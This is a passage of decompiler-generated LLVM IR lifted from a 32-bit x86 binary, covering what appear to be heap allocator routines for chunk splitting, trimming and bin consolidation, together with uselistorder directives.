  %v1_804de00 = add i32 %v0_804ddfa, 4
  %v2_804de00 = inttoptr i32 %v1_804de00 to i32*
  %v3_804de00 = load i32, i32* %v2_804de00, align 4
  %v1_804de03 = and i32 %v3_804de00, -4
  store i32 %v1_804de03, i32* @ecx, align 4
  %v10_804de06 = icmp ult i32 %v1_804de03, %v1_804daa3
  br i1 %v10_804de06, label %dec_label_pc_804de86, label %dec_label_pc_804de0c

dec_label_pc_804de0c:                             ; preds = %dec_label_pc_804ddfa
  store i32 %v1_804db2e, i32* %esi.global-to-local, align 4
  %v2_804de12 = sub i32 %v1_804de03, %v1_804db2e
  store i32 %v2_804de12, i32* %ecx.global-to-local, align 4
  %v2_804de14 = add i32 %v0_804ddfa, %v1_804db2e
  store i32 %v2_804de14, i32* @edx, align 4
  %v1_804de17 = or i32 %v1_804db2e, 1
  store i32 %v1_804de17, i32* %eax.global-to-local, align 4
  store i32 %v2_804de14, i32* @global_var_805836c.141, align 4
  store i32 %v1_804de17, i32* %v2_804de00, align 4
  %v0_804de23.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804de23

dec_label_pc_804de23:                             ; preds = %dec_label_pc_804dab4, %dec_label_pc_804de0c
  %v0_804de23 = phi i32 [ %v5_804dac7, %dec_label_pc_804dab4 ], [ %v0_804de23.pre, %dec_label_pc_804de0c ]
  %v1_804de23 = or i32 %v0_804de23, 1
  store i32 %v1_804de23, i32* @ecx, align 4
  %v0_804de26 = load i32, i32* @ebx, align 4
  %v1_804de26 = add i32 %v0_804de26, 8
  store i32 %v1_804de26, i32* %ebx.global-to-local, align 4
  %v1_804de29 = load i32, i32* @edx, align 4
  %v2_804de29 = add i32 %v1_804de29, 4
  %v3_804de29 = inttoptr i32 %v2_804de29 to i32*
  store i32 %v1_804de23, i32* %v3_804de29, align 4
  br label %dec_label_pc_804de93

dec_label_pc_804de2e:                             ; preds = %dec_label_pc_804d86e
  %v5_804de34 = sub i32 %v1_804d851, %v1_804db2e
  store i32 %v5_804de34, i32* %eax.global-to-local, align 4
  %v2_804de38 = add i32 %v0_804d91c111, %v1_804db2e
  store i32 %v2_804de38, i32* @edx, align 4
  %v1_804de3c = or i32 %v1_804db2e, 1
  store i32 %v2_804de38, i32* @global_var_8058370.142, align 16
  store i32 %v1_804de3c, i32* %v2_804d84b, align 4
  %v0_804de48 = load i32, i32* %eax.global-to-local, align 4
  %v0_804de4a = load i32, i32* @edx, align 4
  store i32 %v0_804de4a, i32* @global_var_805837c.159, align 4
  %v1_804de50 = or i32 %v0_804de48, 1
  store i32 %v1_804de50, i32* @ecx, align 4
  store i32 %v0_804de4a, i32* @global_var_8058380.144, align 128
  %v1_804de59 = add i32 %v0_804de4a, 8
  %v2_804de59 = inttoptr i32 %v1_804de59 to i32*
  store i32 ptrtoint (i32* @global_var_8058374.143 to i32), i32* %v2_804de59, align 4
  %v0_804de60 = load i32, i32* @edx, align 4
  %v1_804de60 = add i32 %v0_804de60, 12
  %v2_804de60 = inttoptr i32 %v1_804de60 to i32*
  store i32 ptrtoint (i32* @global_var_8058374.143 to i32), i32* %v2_804de60, align 4
  %v0_804de67 = load i32, i32* @ecx, align 4
  %v1_804de67 = load i32, i32* @edx, align 4
  %v2_804de67 = add i32 %v1_804de67, 4
  %v3_804de67 = inttoptr i32 %v2_804de67 to i32*
  store i32 %v0_804de67, i32* %v3_804de67, align 4
  %v0_804de6a = load i32, i32* %eax.global-to-local, align 4
  %v1_804de6a = load i32, i32* @edx, align 4
  %v3_804de6a = add i32 %v1_804de6a, %v0_804de6a
  %v4_804de6a = inttoptr i32 %v3_804de6a to i32*
  store i32 %v0_804de6a, i32* %v4_804de6a, align 4
  br label %dec_label_pc_804de78

dec_label_pc_804de6f:                             ; preds = %dec_label_pc_804d87d
  store i32 %v1_804db2e, i32* %ebx.global-to-local, align 4
  %v0_804de73 = load i32, i32* @ebp, align 4
  %v2_804de73 = or i32 %v1_804db2e, 4
  %v3_804de73 = add i32 %v0_804de73, %v2_804de73
  %v4_804de73 = inttoptr i32 %v3_804de73 to i32*
  %v5_804de73 = load i32, i32* %v4_804de73, align 4
  %v6_804de73 = or i32 %v5_804de73, 1
  store i32 %v6_804de73, i32* %v4_804de73, align 4
  br label %dec_label_pc_804de78

dec_label_pc_804de78:                             ; preds = %dec_label_pc_804de2e, %dec_label_pc_804de6f
  %v0_804de78 = load i32, i32* @ebp, align 4
  %v1_804de78 = add i32 %v0_804de78, 8
  store i32 %v1_804de78, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de93

dec_label_pc_804de7d:                             ; preds = %dec_label_pc_804d96d
  %v1_804de7d = load i32, i32* @ebx, align 4
  %v2_804de7d = add i32 %v0_804d97c, 4
  %v3_804de7d = add i32 %v2_804de7d, %v1_804de7d
  %v4_804de7d = inttoptr i32 %v3_804de7d to i32*
  %v5_804de7d = load i32, i32* %v4_804de7d, align 4
  %v6_804de7d = or i32 %v5_804de7d, 1
  store i32 %v6_804de7d, i32* %v4_804de7d, align 4
  br label %dec_label_pc_804de82

dec_label_pc_804de82:                             ; preds = %dec_label_pc_804d985, %dec_label_pc_804de7d
  %v0_804de82 = load i32, i32* @ecx, align 4
  store i32 %v0_804de82, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de93

dec_label_pc_804de86:                             ; preds = %dec_label_pc_804dc44, %dec_label_pc_804ddfa, %dec_label_pc_804dc4e
  %v0_804de86 = load i32, i32* %stack_var_-92, align 4
  %v1_804de86 = call i32 @function_804b4bc(i32 %v0_804de86)
  store i32 %v1_804de86, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804de8d = inttoptr i32 %v1_804de86 to i32*
  store i32 12, i32* %v1_804de8d, align 4
  br label %dec_label_pc_804de93

dec_label_pc_804de93:                             ; preds = %dec_label_pc_804de82, %dec_label_pc_804de78, %dec_label_pc_804de23, %dec_label_pc_804dadf, %dec_label_pc_804da91, %dec_label_pc_804d818, %dec_label_pc_804de86
  store i32 %v2_804d74f, i32* @eax, align 4
  store i32 %v2_804d74f, i32* %stack_var_-92, align 4
  %v2_804de9c = call i32 @function_804ec6e(i32 %v2_804d74f, i32 1)
  store i32 %v2_804de9c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dea4

dec_label_pc_804dea4:                             ; preds = %dec_label_pc_804d76d, %dec_label_pc_804de93
  %v0_804dea7 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804dea7, i32* %eax.global-to-local, align 4
  %v2_804dea9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804dea9, i32* @ebx, align 4
  store i32 %v0_804d73c, i32* @esi, align 4
  store i32 %v0_804d73b, i32* @edi, align 4
  store i32 %v0_804d73a, i32* @ebp, align 4
  ret i32 %v0_804dea7

; uselistorder directives
  uselistorder i32 %v0_804de6a, { 1, 0 }
  uselistorder i32 %v0_804de4a, { 1, 0, 2 }
  uselistorder i32 %v2_804dde7, { 1, 0, 2 }
  uselistorder i32 %v0_804ddd5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804dd6c, { 1, 0 }
  uselistorder i32 %v2_804dd5a, { 1, 0 }
  uselistorder i32 %v1_804dd11, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_804dcfb, { 1, 0, 2 }
  uselistorder i32 %v2_804dcef, { 1, 2, 0 }
  uselistorder i32 %v2_804dcea, { 1, 0, 2 }
  uselistorder i32 %v1_804dcda, { 2, 1, 0 }
  uselistorder i8 %v0_804dca8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804dc8b, { 1, 0, 2 }
  uselistorder i32 %v0_804dd3f91, { 2, 0, 1 }
  uselistorder i32 %v0_804dd4d92, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_804dc85, { 2, 1, 0 }
  uselistorder i32 %v8_804dc5b, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804dc58, { 1, 0 }
  uselistorder i32 %v0_804dc37, { 1, 0 }
  uselistorder i32 %v2_804dc08, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804dc00, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804dbed, { 1, 0 }
  uselistorder i32 %v1_804dbe4, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_804dbd1, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_804dbb5, { 1, 0, 2 }
  uselistorder i32 %v2_804dba1, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_804db6a, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804db5e, { 2, 1, 0 }
  uselistorder i32 %v8_804db4d, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_804db34, { 1, 0, 2 }
  uselistorder i32 %v0_804dad0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804daa3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804da99, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804da8b, { 1, 0 }
  uselistorder i32 %v1_804da22, { 1, 0 }
  uselistorder i32 %v3_804da16, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804da26, { 1, 0 }
  uselistorder i32 %v2_804da10, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804da0d12, { 1, 0 }
  uselistorder i32 %v2_804da02, { 1, 0 }
  uselistorder i32 %v1_804d9e6, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804d9e2, { 2, 1, 0 }
  uselistorder i32 %v1_804d9de, { 1, 0 }
  uselistorder i32 %v1_804d9d2, { 2, 1, 0 }
  uselistorder i32 %v2_804d9c8, { 1, 0 }
  uselistorder i32 %v1_804d9c5, { 1, 2, 0 }
  uselistorder i32 %v4_804d963, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_804d9ae, { 1, 0 }
  uselistorder i32 %v0_804d97c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804d94f, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804d91c, { 1, 2, 0 }
  uselistorder i32 %v2_804d900, { 1, 0 }
  uselistorder i32 %v1_804d8f6, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804d8f1.lcssa, { 1, 0 }
  uselistorder i32 %v3_804d8e1, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804d8d8, { 1, 0, 2 }
  uselistorder i32 %v2_804d8b4, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804d89c, { 2, 1, 0 }
  uselistorder i32 %v0_804d888, { 2, 0, 3, 1 }
  uselistorder i32 %v3_804d84e, { 1, 0, 2 }
  uselistorder i32 %v0_804d91c111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_804d7fb, { 1, 0, 2 }
  uselistorder i32 %v2_804d7ed, { 2, 1, 0 }
  uselistorder i32 %v2_804d7c8, { 2, 1, 0 }
  uselistorder i8 %v0_804d796, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_804db2e, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_804d77f, { 0, 2, 1 }
  uselistorder i32 %v0_804d768, { 1, 0 }
  uselistorder i32 %v2_804d74f, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 18, 0, 1, 2, 3, 4, 5, 6, 7, 23, 8, 24, 9, 10, 11, 12, 13, 14, 22, 15, 16, 17, 19, 20, 21 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_80586a0.156, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_804ef9c, { 1, 0 }
  uselistorder i32 134579060, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_8058380.144, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_804d714, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805836c.141 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805836c.141 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804dea4, { 1, 0 }
  uselistorder label %dec_label_pc_804de93, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804de86, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804de82, { 1, 0 }
  uselistorder label %dec_label_pc_804de78, { 1, 0 }
  uselistorder label %dec_label_pc_804de23, { 1, 0 }
  uselistorder label %dec_label_pc_804ddfa, { 1, 0 }
  uselistorder label %dec_label_pc_804dde7, { 1, 0 }
  uselistorder label %dec_label_pc_804ddd5, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804dd67, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804dd62, { 1, 0 }
  uselistorder label %dec_label_pc_804dd46, { 1, 0 }
  uselistorder label %dec_label_pc_804dcef, { 1, 0 }
  uselistorder label %dec_label_pc_804dcd8, { 1, 0 }
  uselistorder label %dec_label_pc_804dcc1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804dc44, { 1, 0 }
  uselistorder label %dec_label_pc_804dc37, { 1, 0 }
  uselistorder label %dec_label_pc_804dbf8, { 1, 0 }
  uselistorder label %dec_label_pc_804dbd1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804dbb5, { 1, 0 }
  uselistorder label %dec_label_pc_804db9c, { 1, 0 }
  uselistorder label %dec_label_pc_804db7e, { 1, 0 }
  uselistorder label %dec_label_pc_804da99, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804da91, { 1, 0 }
  uselistorder label %dec_label_pc_804da7a, { 1, 0 }
  uselistorder label %dec_label_pc_804da0d, { 1, 0 }
  uselistorder label %dec_label_pc_804da12.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804d9e6, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d96d, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804d8f4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804d8dd, { 1, 0 }
  uselistorder label %dec_label_pc_804d84b, { 1, 0 }
  uselistorder label %dec_label_pc_804d91c.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d818, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804d796, { 1, 0 }
}

define i32 @function_804deb0() local_unnamed_addr {
dec_label_pc_804deb0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_804deb7 = load i32, i32* @edx, align 4
  store i32 %v0_804deb7, i32* %ebp.global-to-local, align 4
  %v1_804deb9 = add i32 %v0_804deb7, 860
  %v2_804deb9 = inttoptr i32 %v1_804deb9 to i32*
  %v3_804deb9 = load i32, i32* %v2_804deb9, align 4
  store i32 %v3_804deb9, i32* @ecx, align 4
  %v1_804debf = add i32 %v0_804deb7, 44
  %v2_804debf = inttoptr i32 %v1_804debf to i32*
  %v3_804debf = load i32, i32* %v2_804debf, align 4
  %v1_804dec2 = add i32 %v3_804debf, 4
  %v2_804dec2 = inttoptr i32 %v1_804dec2 to i32*
  %v3_804dec2 = load i32, i32* %v2_804dec2, align 4
  %v1_804dec5 = and i32 %v3_804dec2, -4
  store i32 %v1_804dec5, i32* @esi, align 4
  %v1_804deca = load i32, i32* @eax, align 4
  %v2_804deca = add i32 %v3_804deb9, -17
  %v2_804decc = add i32 %v2_804deca, %v1_804dec5
  %v3_804decc = sub i32 %v2_804decc, %v1_804deca
  %div = udiv i32 %v3_804decc, %v3_804deb9
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_804decc, %v3_804deb9
  store i32 %tmp10, i32* @edx, align 4
  %v1_804ded4 = add i32 %div, -1
  %v4_804ded7 = mul i32 %v1_804ded4, %v3_804deb9
  store i32 %v4_804ded7, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_804ded7, 1
  br i1 %tmp11, label %dec_label_pc_804df33, label %dec_label_pc_804dede

dec_label_pc_804dede:                             ; preds = %dec_label_pc_804deb0
  %v1_804dee3 = call i32 @function_804f394(i32 0)
  store i32 %v1_804dee3, i32* %edi.global-to-local, align 4
  %v0_804deea = load i32, i32* @esi, align 4
  store i32 %v0_804deea, i32* %eax.global-to-local, align 4
  %v1_804deec = load i32, i32* %ebp.global-to-local, align 4
  %v2_804deec = add i32 %v1_804deec, 44
  %v3_804deec = inttoptr i32 %v2_804deec to i32*
  %v4_804deec = load i32, i32* %v3_804deec, align 4
  %v5_804deec = add i32 %v4_804deec, %v0_804deea
  store i32 %v5_804deec, i32* %eax.global-to-local, align 4
  %v12_804def2 = icmp eq i32 %v1_804dee3, %v5_804deec
  %v1_804def4 = icmp eq i1 %v12_804def2, false
  br i1 %v1_804def4, label %dec_label_pc_804df33, label %dec_label_pc_804def6

dec_label_pc_804def6:                             ; preds = %dec_label_pc_804dede
  %v1_804def9 = sub i32 0, %v4_804ded7
  store i32 %v1_804def9, i32* @ebx, align 4
  %v1_804defc = call i32 @function_804f394(i32 %v1_804def9)
  store i32 %v1_804defc, i32* %eax.global-to-local, align 4
  %v1_804df08 = call i32 @function_804f394(i32 0)
  store i32 %v1_804df08, i32* %eax.global-to-local, align 4
  %v10_804df10 = icmp eq i32 %v1_804df08, -1
  br i1 %v10_804df10, label %dec_label_pc_804df33, label %dec_label_pc_804df15

dec_label_pc_804df15:                             ; preds = %dec_label_pc_804def6
  %v0_804df15 = load i32, i32* %edi.global-to-local, align 4
  %v2_804df17 = sub i32 %v0_804df15, %v1_804df08
  %v12_804df17 = icmp eq i32 %v2_804df17, 0
  store i32 %v2_804df17, i32* @ecx, align 4
  br i1 %v12_804df17, label %dec_label_pc_804df33, label %dec_label_pc_804df1b

dec_label_pc_804df1b:                             ; preds = %dec_label_pc_804df15
  %v0_804df1b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804df1b = add i32 %v0_804df1b, 44
  %v2_804df1b = inttoptr i32 %v1_804df1b to i32*
  %v3_804df1b = load i32, i32* %v2_804df1b, align 4
  store i32 %v3_804df1b, i32* %eax.global-to-local, align 4
  %v1_804df1e = add i32 %v0_804df1b, 872
  %v2_804df1e = inttoptr i32 %v1_804df1e to i32*
  %v3_804df1e = load i32, i32* %v2_804df1e, align 4
  %v5_804df1e = sub i32 %v3_804df1e, %v2_804df17
  store i32 %v5_804df1e, i32* %v2_804df1e, align 4
  %v0_804df24 = load i32, i32* @esi, align 4
  %v1_804df24 = load i32, i32* @ecx, align 4
  %v2_804df24 = sub i32 %v0_804df24, %v1_804df24
  %v1_804df26 = or i32 %v2_804df24, 1
  %v1_804df29 = load i32, i32* %eax.global-to-local, align 4
  %v2_804df29 = add i32 %v1_804df29, 4
  %v3_804df29 = inttoptr i32 %v2_804df29 to i32*
  store i32 %v1_804df26, i32* %v3_804df29, align 4
  br label %dec_label_pc_804df35

dec_label_pc_804df33:                             ; preds = %dec_label_pc_804df15, %dec_label_pc_804def6, %dec_label_pc_804dede, %dec_label_pc_804deb0
  br label %dec_label_pc_804df35

dec_label_pc_804df35:                             ; preds = %dec_label_pc_804df1b, %dec_label_pc_804df33
  %storemerge = phi i32 [ 1, %dec_label_pc_804df1b ], [ 0, %dec_label_pc_804df33 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804df08, { 1, 0, 2 }
  uselistorder i32 %v4_804ded7, { 1, 2, 0 }
  uselistorder i32 %v3_804deb9, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @function_804f394, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804df35, { 1, 0 }
}

define i32 @function_804df3d(i32* %arg1) local_unnamed_addr {
dec_label_pc_804df3d:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_804df3e = load i32, i32* @edi, align 4
  %v0_804df3f = load i32, i32* @esi, align 4
  %v0_804df40 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_804df48 = load i32, i32* %arg1, align 4
  store i32 %v2_804df48, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804df4f = icmp eq i32 %v2_804df48, 0
  br i1 %v1_804df4f, label %dec_label_pc_804e078.preheader, label %dec_label_pc_804df57

dec_label_pc_804e078.preheader:                   ; preds = %dec_label_pc_804df3d
  %v3_804e06d = add i32 %tmp11, 44
  br label %dec_label_pc_804e069

dec_label_pc_804df57:                             ; preds = %dec_label_pc_804df3d
  %v1_804df5b = and i32 %v2_804df48, -3
  store i32 %v1_804df5b, i32* %arg1, align 4
  %v1_804df60 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_804df6b = add i32 %tmp11, 4
  store i32 %v1_804df6b, i32* %eax.global-to-local, align 4
  %v2_804df76 = load i32, i32* %arg1, align 4
  %v2_804df7c = udiv i32 %v2_804df76, 8
  %v2_804df7f = mul nuw i32 %v2_804df7c, 4
  %v3_804df7f = add i32 %tmp11, -4
  %v4_804df7f = add i32 %v3_804df7f, %v2_804df7f
  store i32 %v4_804df7f, i32* %eax.global-to-local, align 4
  %v2_804e046 = add i32 %tmp11, 44
  %v3_804e046 = inttoptr i32 %v2_804e046 to i32*
  %v1_804e019 = add i32 %tmp11, 60
  %v2_804e019 = inttoptr i32 %v1_804e019 to i32*
  br label %dec_label_pc_804df87

dec_label_pc_804df87:                             ; preds = %dec_label_pc_804e05f, %dec_label_pc_804df57
  %v0_804df95 = phi i32 [ %v1_804df6b, %dec_label_pc_804df57 ], [ %v4_804e05f, %dec_label_pc_804e05f ]
  store i32 %v0_804df95, i32* %eax.global-to-local, align 4
  %v1_804df8b = inttoptr i32 %v0_804df95 to i32*
  %v2_804df8b = load i32, i32* %v1_804df8b, align 4
  store i32 %v2_804df8b, i32* @ecx, align 4
  %v1_804df8d = icmp eq i32 %v2_804df8b, 0
  br i1 %v1_804df8d, label %dec_label_pc_804e055, label %dec_label_pc_804df95

dec_label_pc_804df95:                             ; preds = %dec_label_pc_804df87
  store i32 0, i32* %v1_804df8b, align 4
  %v0_804df9b.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804df9b

dec_label_pc_804df9b:                             ; preds = %dec_label_pc_804e049, %dec_label_pc_804df95
  %v0_804dfb8 = phi i32 [ %v3_804df9b, %dec_label_pc_804e049 ], [ %v0_804df9b.pre, %dec_label_pc_804df95 ]
  %v1_804df9b = add i32 %v0_804dfb8, 8
  %v2_804df9b = inttoptr i32 %v1_804df9b to i32*
  %v3_804df9b = load i32, i32* %v2_804df9b, align 4
  store i32 %v3_804df9b, i32* %edx.global-to-local, align 4
  %v1_804dfa2 = add i32 %v0_804dfb8, 4
  %v2_804dfa2 = inttoptr i32 %v1_804dfa2 to i32*
  %v3_804dfa2 = load i32, i32* %v2_804dfa2, align 4
  store i32 %v3_804dfa2, i32* %eax.global-to-local, align 4
  %v1_804dfa7 = and i32 %v3_804dfa2, -2
  store i32 %v1_804dfa7, i32* @edi, align 4
  %v2_804dfaa = urem i32 %v3_804dfa2, 2
  %v3_804dfaa = icmp eq i32 %v2_804dfaa, 0
  %v2_804dfac = add i32 %v1_804dfa7, %v0_804dfb8
  store i32 %v2_804dfac, i32* @ebx, align 4
  %v1_804dfaf = add i32 %v2_804dfac, 4
  %v2_804dfaf = inttoptr i32 %v1_804dfaf to i32*
  %v3_804dfaf = load i32, i32* %v2_804dfaf, align 4
  store i32 %v3_804dfaf, i32* %edx.global-to-local, align 4
  %v1_804dfb6 = icmp eq i1 %v3_804dfaa, false
  br i1 %v1_804dfb6, label %dec_label_pc_804dfd8, label %dec_label_pc_804dfb8

dec_label_pc_804dfb8:                             ; preds = %dec_label_pc_804df9b
  %v1_804dfb8 = inttoptr i32 %v0_804dfb8 to i32*
  %v2_804dfb8 = load i32, i32* %v1_804dfb8, align 4
  store i32 %v2_804dfb8, i32* %ebp.global-to-local, align 4
  %v2_804dfbc = sub i32 %v0_804dfb8, %v2_804dfb8
  store i32 %v2_804dfbc, i32* %eax.global-to-local, align 4
  %v1_804dfbe = add i32 %v2_804dfbc, 8
  %v2_804dfbe = inttoptr i32 %v1_804dfbe to i32*
  %v3_804dfbe = load i32, i32* %v2_804dfbe, align 4
  store i32 %v3_804dfbe, i32* @esi, align 4
  %v1_804dfc1 = add i32 %v2_804dfbc, 12
  %v2_804dfc1 = inttoptr i32 %v1_804dfc1 to i32*
  %v3_804dfc1 = load i32, i32* %v2_804dfc1, align 4
  store i32 %v3_804dfc1, i32* %edx.global-to-local, align 4
  %v1_804dfc4 = add i32 %v3_804dfbe, 12
  %v2_804dfc4 = inttoptr i32 %v1_804dfc4 to i32*
  %v3_804dfc4 = load i32, i32* %v2_804dfc4, align 4
  store i32 %v3_804dfc4, i32* @ecx, align 4
  %v12_804dfc7 = icmp eq i32 %v3_804dfc4, %v2_804dfbc
  %v1_804dfc9 = icmp eq i1 %v12_804dfc7, false
  br i1 %v1_804dfc9, label %dec_label_pc_804e008, label %dec_label_pc_804dfcb

dec_label_pc_804dfcb:                             ; preds = %dec_label_pc_804dfb8
  %v1_804dfcb = add i32 %v3_804dfc1, 8
  %v2_804dfcb = inttoptr i32 %v1_804dfcb to i32*
  %v3_804dfcb = load i32, i32* %v2_804dfcb, align 4
  %v15_804dfcb = icmp eq i32 %v3_804dfcb, %v3_804dfc4
  %v1_804dfce = icmp eq i1 %v15_804dfcb, false
  br i1 %v1_804dfce, label %dec_label_pc_804e008, label %dec_label_pc_804dfd0

dec_label_pc_804dfd0:                             ; preds = %dec_label_pc_804dfcb
  %v2_804dfd0 = add i32 %v2_804dfb8, %v1_804dfa7
  store i32 %v2_804dfd0, i32* @edi, align 4
  store i32 %v3_804dfc1, i32* %v2_804dfc4, align 4
  %v0_804dfd5 = load i32, i32* @esi, align 4
  %v1_804dfd5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804dfd5 = add i32 %v1_804dfd5, 8
  %v3_804dfd5 = inttoptr i32 %v2_804dfd5 to i32*
  store i32 %v0_804dfd5, i32* %v3_804dfd5, align 4
  %v0_804dfe3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804dfd8

dec_label_pc_804dfd8:                             ; preds = %dec_label_pc_804df9b, %dec_label_pc_804dfd0
  %v1_804dfec = phi i32 [ %v2_804dfac, %dec_label_pc_804df9b ], [ %v0_804dfe3.pre, %dec_label_pc_804dfd0 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804dfe0 = and i32 %v3_804dfaf, -4
  store i32 %v1_804dfe0, i32* %ebp.global-to-local, align 4
  %v4_804dfe3 = load i32, i32* %v3_804e046, align 4
  %v15_804dfe3 = icmp eq i32 %v1_804dfec, %v4_804dfe3
  br i1 %v15_804dfe3, label %dec_label_pc_804e039, label %dec_label_pc_804dfe8

dec_label_pc_804dfe8:                             ; preds = %dec_label_pc_804dfd8
  %v2_804dfe8 = add i32 %v1_804dfec, 4
  %v3_804dfe8 = add i32 %v2_804dfe8, %v1_804dfe0
  %v4_804dfe8 = inttoptr i32 %v3_804dfe8 to i32*
  %v5_804dfe8 = load i32, i32* %v4_804dfe8, align 4
  store i32 %v5_804dfe8, i32* %eax.global-to-local, align 4
  %v3_804dfec = inttoptr i32 %v2_804dfe8 to i32*
  store i32 %v1_804dfe0, i32* %v3_804dfec, align 4
  %v0_804dfef = load i32, i32* %eax.global-to-local, align 4
  %v1_804dfef = urem i32 %v0_804dfef, 2
  %v2_804dfef = icmp eq i32 %v1_804dfef, 0
  store i32 %v1_804dfef, i32* %eax.global-to-local, align 4
  %v1_804dff4 = icmp eq i1 %v2_804dfef, false
  br i1 %v1_804dff4, label %dec_label_pc_804e015, label %dec_label_pc_804dff6

dec_label_pc_804dff6:                             ; preds = %dec_label_pc_804dfe8
  %v0_804dff6 = load i32, i32* @ebx, align 4
  %v1_804dff6 = add i32 %v0_804dff6, 8
  %v2_804dff6 = inttoptr i32 %v1_804dff6 to i32*
  %v3_804dff6 = load i32, i32* %v2_804dff6, align 4
  store i32 %v3_804dff6, i32* @edx, align 4
  %v1_804dff9 = add i32 %v0_804dff6, 12
  %v2_804dff9 = inttoptr i32 %v1_804dff9 to i32*
  %v3_804dff9 = load i32, i32* %v2_804dff9, align 4
  store i32 %v3_804dff9, i32* %eax.global-to-local, align 4
  %v1_804dffc = add i32 %v3_804dff6, 12
